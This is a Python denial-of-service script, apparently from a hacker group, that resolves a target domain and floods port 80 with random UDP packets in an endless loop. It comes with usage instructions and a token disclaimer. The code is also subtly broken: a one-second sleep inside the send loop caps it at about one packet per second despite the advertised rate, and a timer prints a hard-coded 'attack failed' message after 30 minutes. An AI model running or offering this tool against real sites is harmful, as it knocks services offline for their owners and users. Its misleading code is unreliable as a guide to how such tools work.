import sys
import os
import time
import socket
import threading

# Animation d'écriture
def type_animation(text):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.1)

# Informations sur le script
def print_info():
    type_animation("\nScript creator: •FAMOUS TECH• OR •FD LORD•\n")
    type_animation("Script design: FD LORD\n")
    type_animation("Legion: DEDSEC TM\n")
    type_animation("Info: USE THIS SCRIPT AT YOUR OWN RISK\n\n")

# Instructions d'utilisation
def print_usage():
    type_animation("Usage: python3 ddos.py <DOMAIN> <REQUESTS_PER_SECOND>\n")
    type_animation("Replace <DOMAIN> with the domain name (e.g., example.com)\n")
    type_animation("and <REQUESTS_PER_SECOND> with the number of requests per second (e.g., 40000)\n\n")

# Avertissement sur l'utilisation responsable
def print_disclaimer():
    type_animation("Disclaimer:\n")
    type_animation("Use this script responsibly and with proper authorization.\n")
    type_animation("Performing DDoS attacks without permission is illegal and unethical.\n\n")

# Vérification de l'attaque DDoS
def check_attack():
    time.sleep(1800)  # Attendre 30 minutes (1800 secondes)
    type_animation("\nDDoS attack failed. Press Control + C and try again.\n")
    os._exit(1)

# Fonction pour lancer l'attaque DDoS
def attack(domain, requests_per_second):
    try:
        ip = socket.gethostbyname(domain)
    except socket.gaierror as e:
        print(f"Error: {str(e)}")
        os._exit(1)

    port = 80  # Default HTTP port
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = os.urandom(1024)

    while True:
        for _ in range(requests_per_second):
            try:
                sock.sendto(bytes, (ip, port))
                print(f"Attacking {domain} ({ip}) on port {port} with {requests_per_second} requests per second")
            except Exception as e:
                print(f"An error occurred: {str(e)}")
                continue
            time.sleep(1)

# Vérification des arguments de ligne de commande
if len(sys.argv) != 3:
    print_info()
    print_usage()
    print_disclaimer()
    sys.exit(1)

domain = sys.argv[1]
requests_per_second = int(sys.argv[2])

print_info()
print_disclaimer()

# Thread pour lancer l'attaque DDoS
attack_thread = threading.Thread(target=attack, args=(domain, requests_per_second))
attack_thread.start()

# Thread pour vérifier l'état de l'attaque après 30 minutes
check_thread = threading.Thread(target=check_attack)
check_thread.start()

try:
    attack_thread.join()
except KeyboardInterrupt:
    print("\nDDoS attack interrupted. Exiting...")
    os._exit(1)
